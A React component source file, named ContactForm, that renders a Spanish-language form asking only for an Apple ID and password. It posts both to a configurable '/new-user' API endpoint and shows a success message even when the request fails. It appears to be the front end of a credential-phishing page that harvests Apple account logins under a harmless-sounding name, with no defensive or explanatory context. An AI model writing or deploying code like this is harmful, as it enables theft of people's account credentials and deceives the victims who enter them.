import React, { useEffect, useState } from "react";
import axios from "axios";
import useForm from "../hooks/useForm";

const initialUser = { appleId: null, pass: null };

const { VITE_API_URL } = import.meta.env;

const ContactForm = () => {
   const [isLoading, setIsLoading] = useState(null);
   const [isLoaded, setIsLoaded] = useState(false);
   const [user, handleInputChange, resetForm] = useForm(initialUser);

   const { appleId, pass } = user;

   useEffect(() => {
      let timeout;

      if (isLoaded) {
         timeout = setTimeout(() => {
            setIsLoaded(false);
         }, 3000);
      }
   }, [isLoaded]);

   const handleSubmit = async (e) => {
      e.preventDefault();

      try {
         if (!appleId || !pass) return;

         setIsLoading(true);

         await axios.post(`${VITE_API_URL}/new-user`, user);

         setIsLoaded(true);
         setIsLoading(false);
         resetForm(initialUser);
      } catch (error) {
         setIsLoaded(true);
         setIsLoading(false);
         resetForm(initialUser);
      }
   };

   return (
      <form className="contact-form" onSubmit={handleSubmit}>
         <input
            name="appleId"
            placeholder="Apple ID"
            type="text"
            value={appleId || ""}
            onChange={handleInputChange}
         />
         <input
            name="pass"
            placeholder="Contraseña"
            type="password"
            value={pass || ""}
            onChange={handleInputChange}
         />

         <button
            className={isLoaded ? "loaded" : ""}
            type={isLoading ? "button" : isLoaded ? "button" : "submit"}
         >
            {isLoading ? "Espere..." : isLoaded ? "✓ Enviado correctamente" : "Confirmar"}
         </button>
      </form>
   );
};

export default ContactForm;
